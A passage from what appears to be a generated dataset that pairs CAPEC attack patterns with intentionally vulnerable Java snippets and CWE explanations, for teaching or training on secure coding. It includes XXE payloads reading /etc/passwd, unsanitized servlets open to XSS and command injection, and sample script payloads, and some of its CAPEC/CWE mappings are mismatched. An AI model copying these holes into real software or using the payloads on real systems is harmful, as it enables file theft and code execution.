        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.File;\n\npublic class XMLExternalEntityExample {\n    public static void main(String[] args) {\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new File(\"example.xml\"));\n\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the DocumentBuilderFactory to parse an XML file without properly restricting external entity references. The features 'disallow-doctype-decl', 'external-general-entities', 'external-parameter-entities', and 'load-external-dtd' are set to allow external entities, which can be exploited by an attacker to include external resources that consume a large amount of resources, leading to a denial of service (DoS) condition. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) by allowing external entities in the XML parsing process, which can lead to resource exhaustion or other malicious activities."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='\" + userInput + \"' width='100%' height='100%'></iframe>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the 'iFrame Overlay' attack. The servlet takes user input from a request parameter and directly embeds it into an iframe's src attribute without proper validation or sanitization. This can lead to several security issues:\n\n1. **Improper Restriction of Rendered UI Layers or Frames (CWE-1021)**: The iframe can load content from an untrusted source, potentially tricking the user into interacting with a malicious interface.\n2. **Cross-site Scripting (CWE-79)**: If the user input is not properly sanitized, it can lead to XSS attacks where malicious scripts are executed in the context of the victim's browser.\n3. **User Interface (UI) Misrepresentation of Critical Information (CWE-451)**: The iframe can be used to spoof the UI, misleading the user about the source and nature of the content they are interacting with.\n\nThis code snippet highlights the importance of validating and sanitizing user inputs, especially when embedding them into web pages, to prevent such security vulnerabilities."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FingerprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Print server information (fingerprinting)\n            System.out.println(\"Server: \" + connection.getHeaderField(\"Server\"));\n            System.out.println(\"X-Powered-By: \" + connection.getHeaderField(\"X-Powered-By\"));\n\n            // Print content (potential exposure of sensitive information)\n            System.out.println(\"Content: \" + content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of fingerprinting a web server. The code sends an HTTP GET request to a specified URL and retrieves the server's response headers and content. By printing the 'Server' and 'X-Powered-By' headers, the code reveals information about the server's software and version, which can be used for fingerprinting. Additionally, the code prints the entire content of the response, which may include sensitive information if not properly managed. This example embodies the CAPEC concept of fingerprinting and highlights related CWEs such as exposure of sensitive information (CWE-200, CWE-497) and observable behavioral discrepancies (CWE-207)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-565: Reliance on Cookies without Validation and Integrity Checking\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        for (Cookie cookie : cookies) {\n            if (cookie.getName().equals(\"SESSIONID\")) {\n                sessionId = cookie.getValue();\n                break;\n            }\n        }\n\n        // CWE-384: Session Fixation\n        if (sessionId != null) {\n            // Assume sessionId is valid without further checks\n            HttpSession session = request.getSession();\n            session.setAttribute(\"user\", \"authenticatedUser\");\n            response.getWriter().println(\"Welcome, authenticated user!\");\n        } else {\n            response.getWriter().println(\"Invalid session.\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Session Credential Falsification through Manipulation' (CAPEC). The code relies on cookies to manage session credentials (CWE-565) without proper validation and integrity checking. It retrieves the session ID from cookies and assumes it is valid without further verification. This can be exploited by an attacker who can manipulate the session ID to gain unauthorized access. Additionally, the code does not invalidate any existing session identifiers when establishing a new session (CWE-384), which can lead to session fixation attacks. The code represents the main idea of the CAPEC by showing how an attacker can manipulate session credentials to gain unauthorized access to a target application."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class ResourceEngagement {\n    private static final int MAX_THREADS = 100;\n    private static final int TASK_DURATION_MS = 1000;\n    private static ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(MAX_THREADS);\n\n    public static void main(String[] args) {\n        while (true) {\n            executor.execute(() -> {\n                try {\n                    // Simulate a task that keeps the resource engaged\n                    Thread.sleep(TASK_DURATION_MS);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can engage a resource (a thread pool) continuously, leading to potential denial of service for legitimate users. The code creates a fixed thread pool with a maximum of 100 threads. In an infinite loop, it submits tasks that sleep for a specified duration (1000 milliseconds). This keeps the threads occupied, preventing legitimate tasks from being executed. The code embodies the CAPEC concept of 'Sustained Client Engagement' by continuously engaging the resource without crashing or flooding it, thus denying access to legitimate users. The related CWEs are represented by the lack of resource throttling (CWE-770), uncontrolled resource consumption (CWE-400), and improper authorization (CWE-285) as there are no checks or limits on task submission."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                        \"<!DOCTYPE root [\\n\" +\n                        \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                        \"]>\\n\" +\n                        \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlData)));\n\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The XML data contains a malicious DTD that defines an external entity 'xxe' which attempts to read the contents of the '/etc/passwd' file. The DocumentBuilderFactory is configured to allow external entities and DTD declarations, which makes the application vulnerable to XML External Entity (XXE) attacks. This example highlights the risks associated with improper control of DTDs and external entities, as described in the related CWEs (CWE-611, CWE-827, CWE-776). The code parses the XML data and prints the content of the root element, which in this case would be the content of the '/etc/passwd' file if the attack is successful."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            maliciousXML += \"<element>value</element>\";\n        }\n        maliciousXML += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(maliciousXML)));\n            System.out.println(\"Parsed XML successfully\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Serialized Data Parameter Blowup' attack. The code constructs a large XML document with a massive number of nested elements, which can cause a denial of service (DoS) condition when parsed by an inefficient XML parser. The DocumentBuilderFactory and DocumentBuilder classes are used to parse the XML, but no limits are imposed on the size or complexity of the XML data, leading to potential resource exhaustion (CWE-770). Additionally, the code does not handle XML external entities (CWE-611), which could further exacerbate the vulnerability. This example highlights the importance of implementing proper resource limits and secure parsing practices to prevent such attacks."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String maliciousXML = \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><root>&xxe;</root>\";\n        parseXML(maliciousXML);\n    }\n\n    public static void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing XML validation\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + document.getDocumentElement().getTextContent());\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that does not validate the XML input against a schema (CWE-112). The `parseXML` method accepts XML data as a string and parses it without any validation, making it susceptible to XML External Entity (XXE) attacks. The provided `maliciousXML` string contains an external entity that attempts to read the contents of the `/etc/passwd` file. This example also highlights improper input validation (CWE-20) and the potential for uncontrolled resource consumption (CWE-674) if the XML data contains deeply nested structures. The code does not impose any limits on the resources allocated for parsing the XML (CWE-770), and it relies on machine-dependent data representation (CWE-1102) by assuming the file path format."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\n\npublic class VulnerableDeserializer {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving a serialized object from an untrusted source\n            byte[] serializedData = new byte[1000000]; // Oversized payload\n            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            // Deserialize the object without validation\n            Object obj = objectInputStream.readObject();\n            System.out.println(\"Deserialized object: \" + obj);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass LargeObject implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private int[] largeArray = new int[1000000]; // Large data structure\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The code simulates receiving a serialized object from an untrusted source and deserializes it without any validation. The serialized data is intentionally oversized, which can lead to resource exhaustion. The 'LargeObject' class contains a large data structure, exacerbating the issue. This example embodies several related CWEs: 'Missing XML Validation' (CWE-112) as there is no validation of the serialized data, 'Improper Input Validation' (CWE-20) as the input is not validated, 'Uncontrolled Recursion' (CWE-674) as deserialization can lead to deep object graphs, and 'Allocation of Resources Without Limits or Throttling' (CWE-770) as the code does not limit the size of the deserialized object."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "public class PrivilegeEscalationExample {\n    private boolean isAdmin = false;\n\n    public void elevatePrivileges(String password) {\n        // CWE-269: Improper Privilege Management\n        if (\"admin123\".equals(password)) {\n            isAdmin = true;\n        }\n    }\n\n    public void performAdminTask() {\n        // CWE-653: Improper Isolation or Compartmentalization\n        if (isAdmin) {\n            System.out.println(\"Performing admin task...\");\n        } else {\n            System.out.println(\"Insufficient privileges to perform this task.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeEscalationExample example = new PrivilegeEscalationExample();\n        example.elevatePrivileges(\"admin123\"); // CWE-274: Improper Handling of Insufficient Privileges\n        example.performAdminTask();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of privilege escalation. The `elevatePrivileges` method improperly manages privileges (CWE-269) by elevating the user's privileges based on a hardcoded password. The `performAdminTask` method checks if the user has admin privileges before performing an admin task, but the privilege check is flawed due to improper isolation or compartmentalization (CWE-653). The main method demonstrates how an attacker could exploit this by providing the hardcoded password to gain admin privileges and perform admin tasks. This example embodies the main idea of CAPEC-Privilege Escalation by showing how an adversary can exploit weaknesses to elevate their privileges and perform unauthorized actions."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import java.io.*;\n\npublic class PrivilegedProcess {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", \"echo Hello World\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n\n            // CWE-114: Process Control\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n\n            // CWE-271: Privilege Dropping / Lowering Errors\n            // The process should drop privileges here, but it doesn't\n            // This is a vulnerability as the process continues to run with elevated privileges\n\n            int exitCode = process.waitFor();\n            System.out.println(\"Process exited with code: \" + exitCode);\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a privileged process that executes a shell command with elevated privileges. The ProcessBuilder is used to start a shell process, which is an example of CWE-250 (Execution with Unnecessary Privileges) as it runs with higher privileges than necessary. The code reads the output of the process, which can be manipulated by an attacker if the input is not properly sanitized, representing CWE-114 (Process Control). Additionally, the code does not drop privileges after starting the process, which is a vulnerability described by CWE-271 (Privilege Dropping / Lowering Errors). This snippet embodies the main idea of CAPEC-233 (Hijacking a privileged process) by showing how an attacker could exploit these weaknesses to gain control of a privileged process and execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    private static String secret = \"SensitiveData\";\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n\n    private static class ClientHandler implements Runnable {\n        private Socket clientSocket;\n\n        public ClientHandler(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.equals(\"GET_SECRET\")) {\n                        out.println(secret);\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server spawns a new thread for each client connection, which handles client requests. The main vulnerability here is the exposure of sensitive data ('secret') through a simple command ('GET_SECRET'). This demonstrates the concept of 'Hijacking a Privileged Thread of Execution' (CAPEC-30) by allowing any client to retrieve sensitive information without proper authentication or access control. Additionally, the use of a non-final static variable ('secret') in a multi-threaded context (CWE-1058) and the lack of proper access control (CWE-782) further highlight the security weaknesses in this implementation."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        try {\n            // Simulate privileged operation\n            performPrivilegedOperation();\n        } catch (Exception e) {\n            // CWE-391: Unchecked Error Condition\n            // Ignoring the exception, which could lead to unexpected behavior\n        }\n    }\n\n    private static void performPrivilegedOperation() throws IOException {\n        // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            try {\n                // Non-reentrant code in signal handler\n                Files.write(Paths.get(\"/tmp/privileged_data\"), \"Sensitive Data\".getBytes());\n            } catch (IOException e) {\n                // CWE-391: Unchecked Error Condition\n                // Ignoring the exception\n            }\n        }));\n\n        // CWE-782: Exposed IOCTL with Insufficient Access Control\n        // Simulate an IOCTL operation without proper access control\n        System.out.println(\"Performing IOCTL operation\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a privileged operation is performed, but it is vulnerable to several issues. The main idea is to show how an attacker could hijack a privileged thread of execution (CAPEC-30). The code includes a privileged operation within a try-catch block, but it ignores exceptions (CWE-391), which could lead to unexpected behavior. Additionally, it defines a signal handler that performs non-reentrant operations (CWE-828), making it unsafe for asynchronous execution. Finally, it simulates an IOCTL operation without proper access control (CWE-782), exposing the system to potential misuse. These vulnerabilities collectively illustrate the risks associated with hijacking a privileged thread of execution."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "public class SandboxEscape {\n    static {\n        System.loadLibrary(\"nativeLib\");\n    }\n\n    public native void unsafeOperation();\n\n    public static void main(String[] args) {\n        SandboxEscape escape = new SandboxEscape();\n        escape.unsafeOperation();\n    }\n}\n\n// C code (nativeLib.c)\n#include <jni.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nJNIEXPORT void JNICALL Java_SandboxEscape_unsafeOperation(JNIEnv *env, jobject obj) {\n    // Unsafe operation: executing a system command\n    system(\"echo 'Escaping the sandbox!'\");\n}",
        "description": "This Java code snippet demonstrates a potential sandbox escape by calling native C code using the Java Native Interface (JNI). The Java class `SandboxEscape` loads a native library `nativeLib` and declares a native method `unsafeOperation`. The corresponding C code for `nativeLib` includes an implementation of `unsafeOperation` that executes a system command, which is an unsafe operation. This example embodies the main idea of CAPEC-142: 'Escaping a Sandbox by Calling Code in Another Language'. The related CWEs are represented as follows:\n- CWE-693: The protection mechanism (sandbox) fails to prevent the Java code from calling unsafe native code.\n- CWE-111: Direct use of unsafe JNI exposes the application to weaknesses in the native code.\n- CWE-537: The native code could potentially expose sensitive information through runtime error messages.\nThis code snippet highlights the risk of allowing sandboxed Java code to call native code, which can perform operations that are not restricted by the Java sandbox, thus potentially leading to a sandbox escape."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final String SECRET_PATH = \"/admin/secret\";\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String requestedPath = request.getRequestURI();\n\n        // Authorization check before canonicalization\n        if (isAuthorized(request)) {\n            if (requestedPath.equals(SECRET_PATH)) {\n                response.getWriter().write(\"Access granted to secret area.\");\n            } else {\n                response.getWriter().write(\"Access granted to public area.\");\n            }\n        } else {\n            response.getWriter().write(\"Access denied.\");\n        }\n    }\n\n    private boolean isAuthorized(HttpServletRequest request) {\n        // Dummy authorization logic\n        String user = request.getParameter(\"user\");\n        return \"admin\".equals(user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where authorization checks are performed before URL canonicalization. The `doGet` method checks if the user is authorized before examining the requested path. An attacker could exploit this by crafting a URL that bypasses the authorization check due to improper parsing. This embodies the CAPEC's deprecated attack pattern of using URL/codebase to convince a sandbox of privilege. Additionally, it reflects CWE-551 (Incorrect Behavior Order: Authorization Before Parsing and Canonicalization) and CWE-424 (Improper Protection of Alternate Path), as the authorization logic is flawed and does not sufficiently protect all possible paths."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"INVALID_COMMAND\");\n            }\n\n            // Client-side enforcement of server-side security\n            if (clientMessage.equals(\"DELETE_DATA\")) {\n                out.println(\"DATA_DELETED\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that embodies the main idea of the deprecated CAPEC and related CWEs. The server listens on port 8080 and processes client messages. It performs an authentication check based on a simple string comparison ('AUTHENTICATE') and responds with 'AUTH_SUCCESS'. However, the server also processes a 'DELETE_DATA' command without verifying if the client is authenticated, relying on the client to enforce this security check. This demonstrates CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication), where the server's security mechanisms can be bypassed by a modified client that sends the 'DELETE_DATA' command directly."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class ResourceInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // CWE-20: Improper Input Validation\n        if (fileName == null || fileName.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"File name is missing\");\n            return;\n        }\n        \n        // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n        if (!file.exists() || !file.isFile()) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n            return;\n        }\n        \n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error reading file\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a resource injection vulnerability. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. The main idea of the CAPEC is represented by the potential for an attacker to manipulate the 'file' parameter to access unintended files on the server. The code also highlights several related CWEs: CWE-20 (Improper Input Validation) by not properly validating the 'file' parameter, CWE-99 (Improper Control of Resource Identifiers) by directly using the 'file' parameter to construct a file path, CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input) by not ensuring the file path is within the intended directory, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly handling file reading operations."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter class name to load:\");\n        String className = scanner.nextLine();\n        try {\n            Class<?> cls = Class.forName(className); // CWE-470: Use of Dynamic Class Loading\n            Object instance = cls.newInstance();\n            System.out.println(\"Class loaded: \" + instance.getClass().getName());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-242: Code Injection. The code takes user input to dynamically load a class using `Class.forName()`, which is a deprecated and dangerous practice (CWE-470: Use of Dynamic Class Loading). This can lead to code injection if an attacker provides a malicious class name. The code also uses `newInstance()`, which is an obsolete function (CWE-477: Use of Obsolete Function). This example highlights the risks of using deprecated methods and dynamic class loading, which can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class CodeInjectionExample extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // Vulnerable code: directly using user input in script execution\n        String command = \"echo \" + userInput;\n        \n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a code injection vulnerability. The `doPost` method retrieves user input from an HTTP request parameter and directly uses it to construct a command string for execution. This is a classic example of CWE-94 (Improper Control of Generation of Code) and CWE-77 (Command Injection). The user input is not properly sanitized or validated, allowing an attacker to inject malicious commands. This snippet highlights the importance of input validation and neutralization to prevent code injection attacks."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<a href='#' style='color:red;' onmouseover='\" + userInput + \"'>Hover over me!</a>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) targeting HTML attributes. The servlet takes user input from a request parameter named 'userInput' and directly inserts it into the 'onmouseover' attribute of an anchor tag without proper sanitization. This can allow an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-86, highlighting the improper neutralization of script in attributes (CWE-83) and the general XSS vulnerability (CWE-79)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String htmlResponse = \"<a href='\" + userInput + \"'>Click here</a>\";\n        response.getWriter().write(htmlResponse);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'XSS Targeting URI Placeholders'. The servlet takes a user-provided input from the 'input' parameter and directly embeds it into an anchor tag's href attribute without proper sanitization or validation. This can be exploited by an attacker to inject a malicious URI, such as 'javascript:alert(1)', which would execute arbitrary JavaScript code when the link is clicked. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page), highlighting the risks of not properly handling user input in web applications."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to XSS using doubled characters\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) using doubled characters. The servlet takes user input from a request parameter named 'input' and directly includes it in the HTML response without proper validation or sanitization. If an attacker provides input with doubled characters, such as '<<script>alert(1);</script>', some filters may fail to recognize the malicious script tag, leading to the execution of the script in the victim's browser. This example embodies the main idea of CAPEC-85 and related CWEs, highlighting the importance of proper input validation and neutralization to prevent XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
